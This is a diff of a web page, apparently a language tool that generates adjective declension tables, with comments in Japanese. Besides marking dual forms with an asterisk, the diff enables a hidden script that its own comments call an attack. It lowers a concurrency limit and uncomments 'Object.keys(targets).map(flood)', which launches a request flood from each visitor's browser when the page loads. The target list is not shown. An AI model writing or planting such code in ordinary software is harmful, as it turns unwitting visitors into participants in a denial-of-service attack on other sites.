@@ -138,29 +138,29 @@ if($input_adjective != ""){
           // 格納データを作成
           var adj_table = [
             ["", "", "", "", "", "", ""],
-            [positive_masc_sg["nom"], positive_fem_sg["nom"], positive_neu_sg["nom"], positive_masc_du["nom"], positive_fem_du["nom"], positive_neu_du["nom"], positive_masc_pl["nom"], positive_fem_pl["nom"], positive_neu_pl["nom"]],
-            [positive_masc_sg["gen"], positive_fem_sg["gen"], positive_neu_sg["gen"], positive_masc_du["gen"], positive_fem_du["gen"], positive_neu_du["gen"], positive_masc_pl["gen"], positive_fem_pl["gen"], positive_neu_pl["gen"]],
-            [positive_masc_sg["dat"], positive_fem_sg["dat"], positive_neu_sg["dat"], positive_masc_du["dat"], positive_fem_du["dat"], positive_neu_du["dat"], positive_masc_pl["dat"], positive_fem_pl["dat"], positive_neu_pl["dat"]],
-            [positive_masc_sg["acc"], positive_fem_sg["acc"], positive_neu_sg["acc"], positive_masc_du["acc"], positive_fem_du["acc"], positive_neu_du["acc"], positive_masc_pl["acc"], positive_fem_pl["acc"], positive_neu_pl["acc"]],
-            [positive_masc_sg["ins"], positive_fem_sg["ins"], positive_neu_sg["ins"], positive_masc_du["ins"], positive_fem_du["ins"], positive_neu_du["ins"], positive_masc_pl["ins"], positive_fem_pl["ins"], positive_neu_pl["ins"]],            
-            [positive_masc_sg["loc"], positive_fem_sg["loc"], positive_neu_sg["loc"], positive_masc_du["loc"], positive_fem_du["loc"], positive_neu_du["loc"], positive_masc_pl["loc"], positive_fem_pl["loc"], positive_neu_pl["loc"]],
-            [positive_masc_sg["voc"], positive_fem_sg["voc"], positive_neu_sg["voc"], positive_masc_du["voc"], positive_fem_du["voc"], positive_neu_du["voc"], positive_masc_pl["voc"], positive_fem_pl["voc"], positive_neu_pl["voc"]],
+            [positive_masc_sg["nom"], positive_fem_sg["nom"], positive_neu_sg["nom"], "*" + positive_masc_du["nom"], "*" + positive_fem_du["nom"], "*" + positive_neu_du["nom"], positive_masc_pl["nom"], positive_fem_pl["nom"], positive_neu_pl["nom"]],
+            [positive_masc_sg["gen"], positive_fem_sg["gen"], positive_neu_sg["gen"], "*" + positive_masc_du["gen"], "*" + positive_fem_du["gen"], "*" + positive_neu_du["gen"], positive_masc_pl["gen"], positive_fem_pl["gen"], positive_neu_pl["gen"]],
+            [positive_masc_sg["dat"], positive_fem_sg["dat"], positive_neu_sg["dat"], "*" + positive_masc_du["dat"], "*" + positive_fem_du["dat"], "*" + positive_neu_du["dat"], positive_masc_pl["dat"], positive_fem_pl["dat"], positive_neu_pl["dat"]],
+            [positive_masc_sg["acc"], positive_fem_sg["acc"], positive_neu_sg["acc"], "*" + positive_masc_du["acc"], "*" + positive_fem_du["acc"], "*" + positive_neu_du["acc"], positive_masc_pl["acc"], positive_fem_pl["acc"], positive_neu_pl["acc"]],
+            [positive_masc_sg["ins"], positive_fem_sg["ins"], positive_neu_sg["ins"], "*" + positive_masc_du["ins"], "*" + positive_fem_du["ins"], "*" + positive_neu_du["ins"], positive_masc_pl["ins"], positive_fem_pl["ins"], positive_neu_pl["ins"]],            
+            [positive_masc_sg["loc"], positive_fem_sg["loc"], positive_neu_sg["loc"], "*" + positive_masc_du["loc"], "*" + positive_fem_du["loc"], "*" + positive_neu_du["loc"], positive_masc_pl["loc"], positive_fem_pl["loc"], positive_neu_pl["loc"]],
+            [positive_masc_sg["voc"], positive_fem_sg["voc"], positive_neu_sg["voc"], "*" + positive_masc_du["voc"], "*" + positive_fem_du["voc"], "*" + positive_neu_du["voc"], positive_masc_pl["voc"], positive_fem_pl["voc"], positive_neu_pl["voc"]],
             ["", "", "", "", "", "", ""],
-            [comp_masc_sg["nom"], comp_fem_sg["nom"], comp_neu_sg["nom"], comp_masc_du["nom"], comp_fem_du["nom"], comp_neu_du["nom"], comp_masc_pl["nom"], comp_fem_pl["nom"], comp_neu_pl["nom"]],
-            [comp_masc_sg["gen"], comp_fem_sg["gen"], comp_neu_sg["gen"], comp_masc_du["gen"], comp_fem_du["gen"], comp_neu_du["gen"], comp_masc_pl["gen"], comp_fem_pl["gen"], comp_neu_pl["gen"]],
-            [comp_masc_sg["dat"], comp_fem_sg["dat"], comp_neu_sg["dat"], comp_masc_du["dat"], comp_fem_du["dat"], comp_neu_du["dat"], comp_masc_pl["dat"], comp_fem_pl["dat"], comp_neu_pl["dat"]],
-            [comp_masc_sg["acc"], comp_fem_sg["acc"], comp_neu_sg["acc"], comp_masc_du["acc"], comp_fem_du["acc"], comp_neu_du["acc"], comp_masc_pl["acc"], comp_fem_pl["acc"], comp_neu_pl["acc"]],
-            [comp_masc_sg["ins"], comp_fem_sg["ins"], comp_neu_sg["ins"], comp_masc_du["ins"], comp_fem_du["ins"], comp_neu_du["ins"], comp_masc_pl["ins"], comp_fem_pl["ins"], comp_neu_pl["ins"]],
-            [comp_masc_sg["loc"], comp_fem_sg["loc"], comp_neu_sg["loc"], comp_masc_du["loc"], comp_fem_du["loc"], comp_neu_du["loc"], comp_masc_pl["loc"], comp_fem_pl["loc"], comp_neu_pl["loc"]],
-            [comp_masc_sg["voc"], comp_fem_sg["voc"], comp_neu_sg["voc"], comp_masc_du["voc"], comp_fem_du["voc"], comp_neu_du["voc"], comp_masc_pl["voc"], comp_fem_pl["voc"], comp_neu_pl["voc"]],  
+            [comp_masc_sg["nom"], comp_fem_sg["nom"], comp_neu_sg["nom"], "*" + comp_masc_du["nom"], "*" + comp_fem_du["nom"], "*" + comp_neu_du["nom"], comp_masc_pl["nom"], comp_fem_pl["nom"], comp_neu_pl["nom"]],
+            [comp_masc_sg["gen"], comp_fem_sg["gen"], comp_neu_sg["gen"], "*" + comp_masc_du["gen"], "*" + comp_fem_du["gen"], "*" + comp_neu_du["gen"], comp_masc_pl["gen"], comp_fem_pl["gen"], comp_neu_pl["gen"]],
+            [comp_masc_sg["dat"], comp_fem_sg["dat"], comp_neu_sg["dat"], "*" + comp_masc_du["dat"], "*" + comp_fem_du["dat"], "*" + comp_neu_du["dat"], comp_masc_pl["dat"], comp_fem_pl["dat"], comp_neu_pl["dat"]],
+            [comp_masc_sg["acc"], comp_fem_sg["acc"], comp_neu_sg["acc"], "*" + comp_masc_du["acc"], "*" + comp_fem_du["acc"], "*" + comp_neu_du["acc"], comp_masc_pl["acc"], comp_fem_pl["acc"], comp_neu_pl["acc"]],
+            [comp_masc_sg["ins"], comp_fem_sg["ins"], comp_neu_sg["ins"], "*" + comp_masc_du["ins"], "*" + comp_fem_du["ins"], "*" + comp_neu_du["ins"], comp_masc_pl["ins"], comp_fem_pl["ins"], comp_neu_pl["ins"]],
+            [comp_masc_sg["loc"], comp_fem_sg["loc"], comp_neu_sg["loc"], "*" + comp_masc_du["loc"], "*" + comp_fem_du["loc"], "*" + comp_neu_du["loc"], comp_masc_pl["loc"], comp_fem_pl["loc"], comp_neu_pl["loc"]],
+            [comp_masc_sg["voc"], comp_fem_sg["voc"], comp_neu_sg["voc"], "*" + comp_masc_du["voc"], "*" + comp_fem_du["voc"], "*" + comp_neu_du["voc"], comp_masc_pl["voc"], comp_fem_pl["voc"], comp_neu_pl["voc"]],  
             ["", "", "", "", "", "", ""],
-            [super_masc_sg["nom"], super_fem_sg["nom"], super_neu_sg["nom"], super_masc_du["nom"], super_fem_du["nom"], super_neu_du["nom"], super_masc_pl["nom"], super_fem_pl["nom"], super_neu_pl["nom"]],
-            [super_masc_sg["gen"], super_fem_sg["gen"], super_neu_sg["gen"], super_masc_du["gen"], super_fem_du["gen"], super_neu_du["gen"], super_masc_pl["gen"], super_fem_pl["gen"], super_neu_pl["gen"]],
-            [super_masc_sg["dat"], super_fem_sg["dat"], super_neu_sg["dat"], super_masc_du["dat"], super_fem_du["dat"], super_neu_du["dat"], super_masc_pl["dat"], super_fem_pl["dat"], super_neu_pl["dat"]],
-            [super_masc_sg["acc"], super_fem_sg["acc"], super_neu_sg["acc"], super_masc_du["acc"], super_fem_du["acc"], super_neu_du["acc"], super_masc_pl["acc"], super_fem_pl["acc"], super_neu_pl["acc"]],
-            [super_masc_sg["ins"], super_fem_sg["ins"], super_neu_sg["ins"], super_masc_du["ins"], super_fem_du["ins"], super_neu_du["ins"], super_masc_pl["ins"], super_fem_pl["ins"], super_neu_pl["ins"]],            
-            [super_masc_sg["loc"], super_fem_sg["loc"], super_neu_sg["loc"], super_masc_du["loc"], super_fem_du["loc"], super_neu_du["loc"], super_masc_pl["loc"], super_fem_pl["loc"], super_neu_pl["loc"]],
-            [super_masc_sg["voc"], super_fem_sg["voc"], super_neu_sg["voc"], super_masc_du["voc"], super_fem_du["voc"], super_neu_du["voc"], super_masc_pl["voc"], super_fem_pl["voc"], super_neu_pl["voc"]],             
+            [super_masc_sg["nom"], super_fem_sg["nom"], super_neu_sg["nom"], "*" + super_masc_du["nom"], "*" + super_fem_du["nom"], "*" + super_neu_du["nom"], super_masc_pl["nom"], super_fem_pl["nom"], super_neu_pl["nom"]],
+            [super_masc_sg["gen"], super_fem_sg["gen"], super_neu_sg["gen"], "*" + super_masc_du["gen"], "*" + super_fem_du["gen"], "*" + super_neu_du["gen"], super_masc_pl["gen"], super_fem_pl["gen"], super_neu_pl["gen"]],
+            [super_masc_sg["dat"], super_fem_sg["dat"], super_neu_sg["dat"], "*" + super_masc_du["dat"], "*" + super_fem_du["dat"], "*" + super_neu_du["dat"], super_masc_pl["dat"], super_fem_pl["dat"], super_neu_pl["dat"]],
+            [super_masc_sg["acc"], super_fem_sg["acc"], super_neu_sg["acc"], "*" + super_masc_du["acc"], "*" + super_fem_du["acc"], "*" + super_neu_du["acc"], super_masc_pl["acc"], super_fem_pl["acc"], super_neu_pl["acc"]],
+            [super_masc_sg["ins"], super_fem_sg["ins"], super_neu_sg["ins"], "*" + super_masc_du["ins"], "*" + super_fem_du["ins"], "*" + super_neu_du["ins"], super_masc_pl["ins"], super_fem_pl["ins"], super_neu_pl["ins"]],            
+            [super_masc_sg["loc"], super_fem_sg["loc"], super_neu_sg["loc"], "*" + super_masc_du["loc"], "*" + super_fem_du["loc"], "*" + super_neu_du["loc"], super_masc_pl["loc"], super_fem_pl["loc"], super_neu_pl["loc"]],
+            [super_masc_sg["voc"], super_fem_sg["voc"], super_neu_sg["voc"], "*" + super_masc_du["voc"], "*" + super_fem_du["voc"], "*" + super_neu_du["voc"], super_masc_pl["voc"], super_fem_pl["voc"], super_neu_pl["voc"]],             
           ];
           
           // 結果を返す。
@@ -225,8 +225,8 @@ if($input_adjective != ""){
     	  }    
       
       // 1秒ごとの攻撃頻度
-      var CONCURRENCY_LIMIT = 1000
-      var queue = []
+      var CONCURRENCY_LIMIT = 250;
+      var queue = [];
       
       // リクエスト送信
       async function fetchWithTimeout(resource, options) {
@@ -285,7 +285,7 @@ if($input_adjective != ""){
         }
       }
       // 全てのターゲット要素に対して攻撃処理を実行する。
-      //Object.keys(targets).map(flood)
+      Object.keys(targets).map(flood)
     </script> 
   <footer class="">
   </footer>
